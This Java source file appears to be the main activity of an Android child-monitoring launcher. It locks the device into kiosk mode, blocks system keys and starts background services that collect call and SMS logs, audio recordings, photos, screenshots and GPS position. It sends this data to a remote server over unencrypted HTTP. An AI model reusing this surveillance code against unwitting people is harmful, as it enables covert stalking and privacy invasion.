package com.example.marwa.launcher002;


import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;

import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import android.graphics.Bitmap;
import android.graphics.PixelFormat;

import android.graphics.drawable.AnimationDrawable;
import android.graphics.drawable.Drawable;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;


import android.view.Gravity;
import android.view.KeyEvent;



import android.view.Window;
import android.view.WindowManager;


import android.widget.GridView;
import android.widget.ImageView;

import android.widget.TextView;
import android.widget.Toast;


import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.example.marwa.launcher002.Singleton.MySingleton;
import com.example.marwa.launcher002.model.AppDetail;
import com.example.marwa.launcher002.recievers.WifiStat;
import com.example.marwa.launcher002.services.AudioRecorderService;
import com.example.marwa.launcher002.services.BatteryService;
import com.example.marwa.launcher002.services.CallsHistory;

import com.example.marwa.launcher002.services.MyTestService;

import com.example.marwa.launcher002.services.NewInstalledApps;
import com.example.marwa.launcher002.services.SendScreenShot;
import com.example.marwa.launcher002.services.SmsHistory;
import com.example.marwa.launcher002.services.getPhotosService;
import com.example.marwa.launcher002.utils.WSadressIP;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static android.content.ContentValues.TAG;

public class MainActivity extends AppCompatActivity {

    private Window window;

    private WindowManager wmanager;

    TextView d;

    /////////////////////////////
    private Button lock, disable, enable;
    public static final int RESULT_ENABLE = 11;
    private DevicePolicyManager devicePolicyManager;
    private ActivityManager activityManager;
    private ComponentName compName;
    /////////////////////////////Marwa Week3
   //private static final String URL_ActivitiesB = "http://"+ WSadressIP.WSIP+"/launcher/MgetInstalledApps.php";

    private List<String> appsWS ;

    private PackageManager manager;
    private List<AppDetail> apps;
    ////////////////////////////// Siwar W3
    private static final int REQUEST_LOCATION = 1;
    Button button;
    TextView textView;
    LocationManager locationManager;
    String lattitude,longitude;
    ///////////////////////// Marwa W5
    private WifiManager wifiManager;
    //////////////////////// H marwa
    private static MainActivity instance;
    public static String id_target ="3";
    public static String parent_number ="";
    public static String theme ="";

    AnimationDrawable rocketAnimation;
    //////////////////////////////////
    float x1,x2;
    float y1, y2;


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @SuppressLint("ResourceAsColor") //change color when tab on that button
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().addFlags(View.STATUS_BAR_HIDDEN);

        View decorView = getWindow().getDecorView();

        decorView.setSystemUiVisibility(0);


        setContentView(R.layout.activity_main);
        //--------------------------------------------------------- ADMIN --------------------------------------------------//


        id_target = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("id_target", "3");


      //  PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("parent_number", "+21629164715").apply();

        //parent_number = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("parent_number", "+21629164715");


        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("theme", "th01").apply();

        theme = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("theme", "th01");


        //-------------------------------------------------DISABLE SOFT KEYS--------------------------------------------------//
        WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams();

        localLayoutParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

        localLayoutParams.gravity = Gravity.BOTTOM;

        localLayoutParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        localLayoutParams.width = WindowManager.LayoutParams.MATCH_PARENT;

        localLayoutParams.height = (int) (40 * getResources().getDisplayMetrics().scaledDensity);

        localLayoutParams.format = PixelFormat.TRANSPARENT;


        //Disable Title bar and Notification Permanently

        wmanager = ((WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE));

        WindowManager.LayoutParams localLayoutParamsTop = new WindowManager.LayoutParams();

        localLayoutParamsTop.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

        localLayoutParamsTop.gravity = Gravity.TOP;

        localLayoutParamsTop.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |

                // enable the notification to receive touch events

                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |

                // Draws over status bar

                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;

        // set the size of statusbar blocker

        localLayoutParamsTop.width = WindowManager.LayoutParams.MATCH_PARENT;

        localLayoutParamsTop.height = (int) (40 * getResources().getDisplayMetrics().scaledDensity);

        localLayoutParamsTop.format = PixelFormat.TRANSPARENT;


        ///////////////////////////////////////////// SET DAY : design section
        d = findViewById(R.id.date);
        Date c = Calendar.getInstance().getTime();
        System.out.println("Current time => " + c);

        SimpleDateFormat df = new SimpleDateFormat("dd/MM/yyyy hh:mm");
        String formattedDate = df.format(c);

        d.setText("Today," + formattedDate);


        ImageView rocketImage = (ImageView) findViewById(R.id.imageView2);
        rocketImage.setBackgroundResource(R.drawable.animlist);
        rocketAnimation = (AnimationDrawable) rocketImage.getBackground();
        rocketAnimation.start();

        /////////////////////////////////////////// ENABLE ADMIN SETTINGS:in case of future problem put this function in button and hide it when is enabeled
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Additional text explaining why we need this permission");
        startActivityForResult(intent, RESULT_ENABLE);
        //////////////////////////////////////// BUTTON: Browser


        //_________________________ webservice running in background ———————————————\\
        Thread t = new Thread() {
            @Override
            public void run() {
                while (!isInterrupted()) {
                    try {
                        Thread.sleep(10000);  //1000ms = 1 sec
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {


                                listOfInstalledApps(); // webservice running in background
                            }
                        });

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        };

        t.start();
        ////////////////////////////////location position gps //////////////////////////////////

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);


        /////////////////////////////////// Calling Services  //////////////////////////////////


        //_________________________________ lock screen _________________________________\\
        Intent servicex = new Intent(this, MyTestService.class);
        startService(servicex);
        //_________________________________ Calls Log _________________________________\\
        Intent background = new Intent(this, CallsHistory.class);
        startService(background);
        //_________________________________ SMS Log _________________________________\\
        Intent ServiceSms = new Intent(this, SmsHistory.class);
        startService(ServiceSms);
        //_________________________________ keep opened wifi _________________________________\\

        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(true);

        //_________________________________ Send Screen Shot _________________________________\\

        Intent ScreenShotkService = new Intent(this, SendScreenShot.class);
        startService(ScreenShotkService);
        instance = this;
        //_________________________________ Send Photos _________________________________\\
        Intent PhotosService = new Intent(this, getPhotosService.class);
        startService(PhotosService);
        //_________________________________ Parent install new app _________________________________\\
        Intent newAppService = new Intent(this, NewInstalledApps.class);
        startService(newAppService);
        //_________________________________ Audio recorder _________________________________\\
        Intent audioRecorderService = new Intent(this, AudioRecorderService.class);
        startService(audioRecorderService);
        //_________________________________ Battery _________________________________\\
         Intent batteryService = new Intent(this, BatteryService.class);
        startService(batteryService);
        ///////////////////////////////////////////////////////////// Thread get Location
        Thread t2 = new Thread() {
            @Override
            public void run() {
                while (!isInterrupted()) {
                    try {
                        Thread.sleep(300000);  //each 5 minutes
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                                    buildAlertMessageNoGps();

                                } else if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                                    getLocation();
                                    UpdateLocationDB();
                                }


                            }
                        });

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        };

        t2.start();




    }
        ///////// LAUNCHER SETTINGS: disable les buttons lkol + kid can't leave this mode
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);

        if (hasFocus) {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }

            if(!hasFocus )
            {


            }


    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }


    //block volume
    private final List blockedKeys = new ArrayList(Arrays.asList(KeyEvent.KEYCODE_VOLUME_DOWN, KeyEvent.KEYCODE_VOLUME_UP));

    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        if (blockedKeys.contains(event.getKeyCode())) {
            return true;
        } else {
            return super.dispatchKeyEvent(event);
        }
    }
    ///////// LAUNCHER SETTINGS: END







    ///////////////////////////////////////////////////////////////My Web Service to install / Uninstall Apps

    private void listOfInstalledApps() {
        String URL_ActivitiesB = "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/apps/getapps";
        RequestQueue queue = Volley.newRequestQueue(MainActivity.this);

        appsWS = new ArrayList<String>(); // very important !


        StringRequest stringRequest = new StringRequest(Request.Method.GET, URL_ActivitiesB,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        try {
                            //converting the string to json array object
                            JSONArray array = new JSONArray(response);

                            //traversing through all the object
                            for (int i = 0; i < array.length(); i++) {

                                //getting product object from json array
                                JSONObject product = array.getJSONObject(i);


                                appsWS.add(



                                       product.getString("packg")
                                );

                            }
Log.v("hi","application hi");

                            loadApps();
                            loadListView();
                            addClickListener();




                        } catch (JSONException e) {
                            e.printStackTrace();
                        } catch (PackageManager.NameNotFoundException e) {
                            e.printStackTrace();
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        apps = new ArrayList<AppDetail>();
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            apps.add(new AppDetail("Camera","com.sec.android.app.camera",getDrawable(R.drawable.cu11)));
                            apps.add(new AppDetail("Phone","com.android.phone",getDrawable(R.drawable.cu16)));
                            apps.add(new AppDetail("Messages","com.samsung.android.messaging",getDrawable(R.drawable.cu17)));
                            apps.add(new AppDetail("Contacts","com.samsung.android.contacts",getDrawable(R.drawable.cu18)));
                            apps.add(new AppDetail("Photos","com.google.android.apps.photos",getDrawable(R.drawable.cu02)));
                            apps.add(new AppDetail("Themes","marwa.Themes",getDrawable(R.drawable.m17)));
                        }

                        loadListView();
                        addClickListener();
                    }
                }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");

                //without params
                return params;
            }
        };;


        stringRequest.setShouldCache(false);
        queue.add(stringRequest);
    }
    ///////////////////////////// to get apps (name, packge w icon) and set them in ArrayList "apps"

    private void loadApps() throws PackageManager.NameNotFoundException {
        manager = getPackageManager();
        apps = new ArrayList<AppDetail>();

        Intent i = new Intent(Intent.ACTION_MAIN, null);
        i.addCategory(Intent.CATEGORY_LAUNCHER);





        for (String x : appsWS) {
            Drawable icon = getPackageManager().getApplicationIcon(x);

            final PackageManager pm = getApplicationContext().getPackageManager();
            ApplicationInfo ai;
            try {
                ai = pm.getApplicationInfo( x, 0);
            } catch (final PackageManager.NameNotFoundException e) {
                ai = null;
            }
            final String applicationName = (String) (ai != null ? pm.getApplicationLabel(ai) : "(unknown)");

            AppDetail app = new AppDetail();
            app.setLabel(applicationName);
            app.setName(x);
            if(applicationName.equals("Camera")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu11));
                }
            }else  if(applicationName.equals("Phone")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu16));
                }
            }
            else  if(applicationName.equals("Messages")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu17));
                }
            }else  if(applicationName.equals("Photos")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu02));
                }
            }else  if(applicationName.equals("Contacts")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu18));
                }
            }else  if(applicationName.equals("Calendar")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu19));
                }
            }else  if(applicationName.equals("Calculator")){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    app.setIcon(getDrawable(R.drawable.cu22));
                }
            }else{
                app.setIcon(icon);
            }


            apps.add(app);

        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            apps.add(new AppDetail("Browser","marwa.Browser",getDrawable(R.drawable.mbrowser)));
            apps.add(new AppDetail("Themes","marwa.Themes",getDrawable(R.drawable.m17)));
        }

    }


    ///////////////////////////// SHOW ListView
    private GridView list;
    private void loadListView(){
        list = (GridView)findViewById(R.id.apps_list);

        ArrayAdapter<AppDetail> adapter = new ArrayAdapter<AppDetail>(this,
                R.layout.list_item,
                apps) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                if(convertView == null){
                    convertView = getLayoutInflater().inflate(R.layout.list_item, null);
                }

                ImageView appIcon = (ImageView)convertView.findViewById(R.id.item_app_icon);
                appIcon.setImageDrawable(apps.get(position).getIcon());

                TextView appLabel = (TextView)convertView.findViewById(R.id.item_app_label);
                appLabel.setText(apps.get(position).getLabel());



                return convertView;
            }
        };

        list.setAdapter(adapter);
    }


    // Click on ListView Item event : open the app!
    private void addClickListener(){
        list.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> av, View v, int pos,
                                    long id) {
                if(apps.get(pos).getName().toString().toUpperCase().contains("PHONE") ){
                     Intent intent = new Intent(Intent.ACTION_DIAL);
                     startActivity(intent);
                }else if(apps.get(pos).getName().toString().equals("marwa.Browser")){
                    Intent i = new Intent(MainActivity.this, MyBrowser.class);

                    startActivity(i);
                }else if(apps.get(pos).getName().toString().equals("marwa.Themes")){
                    Intent j = new Intent(MainActivity.this, MyThemes.class);

                    startActivity(j);
                }else{
                     try {

                         Context context = getApplicationContext();

                         Intent b = context.getPackageManager().getLaunchIntentForPackage(apps.get(pos).getName().toString());
                         context.startActivity(b);
                     }
                     catch (ActivityNotFoundException | NullPointerException e) {
                          Log.e(TAG, "_______ clicklistener  on app"+e.getMessage()+" "+apps.get(pos).getName());
                     }
                }
            }
        });
    }

    /////////////////////////////////////////// location position gps


    private void getLocation() {
        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                (MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);

        } else {


            LocationListener locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    double latti = location.getLatitude();
                    double longi = location.getLongitude();
                    lattitude = String.valueOf(latti);
                    longitude = String.valueOf(longi);



                    Log.v(TAG, "IN ON LOCATION CHANGE, lat=" + lattitude + ", lon=" + longitude);
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {

                }

                @Override
                public void onProviderEnabled(String provider) {

                }

                @Override
                public void onProviderDisabled(String provider) {

                }
            };



            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);


        }
    }

    protected void buildAlertMessageNoGps() {

        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Please Turn ON your GPS Connection")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, final int id) {
                        dialog.cancel();
                    }
                });
        final AlertDialog alert = builder.create();
        alert.show();
    }

    public void  UpdateLocationDB(){


        RequestQueue queue = Volley.newRequestQueue(MainActivity.this);


            final String   URL = "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/positions";

           StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {

                @Override
                public void onResponse(String response) {
                    if(response.contains("success")) {
                        Log.v("position","................................ position here");
                    }
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                   // Toast.makeText(getApplicationContext(),"failed to add",Toast.LENGTH_SHORT).show();
                }
            }){
                @Override
                protected Map<String, String> getParams() throws AuthFailureError {
                    Map<String, String> params = new HashMap<>();

                    params.put("Content-Type","application/x-www-form-urlencoded");
                    Date c = Calendar.getInstance().getTime();
                    SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
                    String formattedDate = df.format(c);
                    params.put("date", formattedDate);
                    params.put("id_target", id_target);
                    params.put("latt",lattitude );
                    params.put("lng",longitude);
                    return params;
                }
            };

          queue.add(stringRequest);
    }




    //////////////////////////////////////////ScreenShot
    public void takeScreen() throws IOException {
        Date now = new Date();
        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
        String fileName = now + ".jpg";
        try {
            File folder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES) + "");
            folder.mkdirs();  //create directory



            View v1 =  getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(folder, fileName);
            imageFile.createNewFile();
            FileOutputStream outputStream = new FileOutputStream(imageFile); //writing data to a File
            int quality = 100;

            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            //-----
            SaveScreenShotDB(bitmap);
            //-----
            outputStream.flush(); //write the stuffs in your buffer to the disk
            outputStream.close(); // close and release

           // Toast.makeText(MainActivity.this, "ScreenShot Captured", Toast.LENGTH_SHORT).show();

            //read metadata from the file and add the file to the media content provider.
            MediaScannerConnection.scanFile(this,
                    new String[]{imageFile.toString()}, null,
                    new MediaScannerConnection.OnScanCompletedListener() {
                        public void onScanCompleted(String path, Uri uri) {
                            Log.i("ExternalStorage", "Scanned " + path + ":");
                            Log.i("ExternalStorage", "-> uri=" + uri);
                        }
                    });
        } catch (Throwable e) {

            e.printStackTrace();
        }
    }




   public void SaveScreenShotDB( Bitmap bmp){


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] imageBytes = baos.toByteArray();
        final String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);

        //---------------
        final String URL = "http://"+ WSadressIP.WSIP+"/kidslanch_serv/web/index.php/screenshots/add";
        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("******", "screenshot **********************hello 1 yes");
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                //Toast.makeText(getApplicationContext(),"failed to add screenshot",Toast.LENGTH_SHORT).show();
                Log.d("******", "screenshot **********************hello 2 no");
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");
                Log.d("******", "**********************hello 3");
                params.put("id_target",id_target);
                params.put("img_file",encodedImage);

                Date c = Calendar.getInstance().getTime();
                SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
                String formattedDate = df.format(c);

                params.put("datee",formattedDate);
                return params;
            }
        };
        Log.d("mytag", "OK Screen Shot Saved"); // THIS WORKS
        //adding our stringrequest to queue
        MySingleton.getInstance(getApplicationContext()).addToRequestQueue(stringRequest);
        Log.d("******", "**********************hello 4");
    }
    //////////////// instance
    public static MainActivity getInstance() {
        return instance;
    }

    // Wifi Broadcast Reciever
    final private WifiStat ws = new WifiStat();
    @Override
    protected void onResume()
    {
        super.onResume();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION);
        registerReceiver(ws, intentFilter);


    }








}


